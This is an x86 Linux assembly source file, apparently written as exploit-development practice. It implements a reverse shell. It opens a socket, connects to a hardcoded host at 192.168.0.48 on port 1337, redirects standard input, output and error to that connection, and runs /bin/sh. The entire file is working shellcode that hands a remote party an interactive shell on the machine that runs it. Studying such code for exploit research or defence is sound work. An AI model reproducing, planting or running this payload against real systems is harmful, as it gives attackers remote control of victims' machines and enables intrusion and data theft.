

;---------------------------------
;
; Author: Michael Dubell
;
; Purpose:
; Reverse shell connect
;
;----------------------------------

global _start

section .text

_start:

    ; zero out registers
    xor eax, eax
    xor ebx, ebx
    xor edx, edx

    ; -------------------------------------
    ; # Setup socket

    ; socketcall()
    mov al, 0x66     ; __NR_socketcall 102
    mov bl, 0x1      ; SYS_SOCKET

    ; # Setup socket
    ; Resulting file descriptor is saved to eax
    push edx
    push 0x1
    push 0x2
    mov ecx, esp     ; Arguments are located top of the stack
    int 0x80         ; Tell the kernel it's time to boogie
    mov edi, eax     ; $eax contains the file descriptor created by socket(), store it in $edi for now

    ; ---------------------------------
    ; # Setup connect
    ; socketcall
    mov al, 0x66     ; socketcall()
    mov bl, 0x3      ; SYS_CONNECT

    ; setup sockaddr struct
    push 0x3000A8C0    ; 48.0.168.192
    push word 0x3905        ; htons(1337)
    push word 0x2           ; AF_INET

    mov ecx, esp     ; Store the address that points to our struct

    ; Push the arguments for connect()
    push 0x10        ; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)
    push ecx         ; Points to our sockaddr_in struct
    push edi         ; Contains our file descriptor

    mov ecx, esp     ; Second parameter for socketcall, points to arguments required by connect()
    int 0x80         ; Tell the kernel let's go!

    ; --------------------
    ; # Setup dup2
    ; redirect to stdin
    mov al, 0x3f     ; syscall number dup2 63 --> 0x3f
    mov ebx, edi     ; peer's file descriptor
    mov ecx, edx     ; STDIN
    int 0x80

    ; redirect to stdout
    mov al, 0x3f
    mov cl, 0x1      ; STDOUT
    int 0x80

    ; redirect to stderr
    mov al, 0x3f
    mov cl, 0x2      ; STDERR
    int 0x80

    ; --------------------
    ; # Setup execv
    xor edx, edx
    push edx

    ; push //bin/sh onto the stack
    push 0x68732f6e
    push 0x69622f2f

    ; Set address of esp to ebx, which points
    ; to //bin/sh
    mov ebx, esp

    xor ecx, ecx
    xor eax, eax
    mov al, 0xb      ; execv syscall
    int 0x80

    ; -----------------------------
    ; THE END - HAVE A NICE SHELL |
    ; -----------------------------
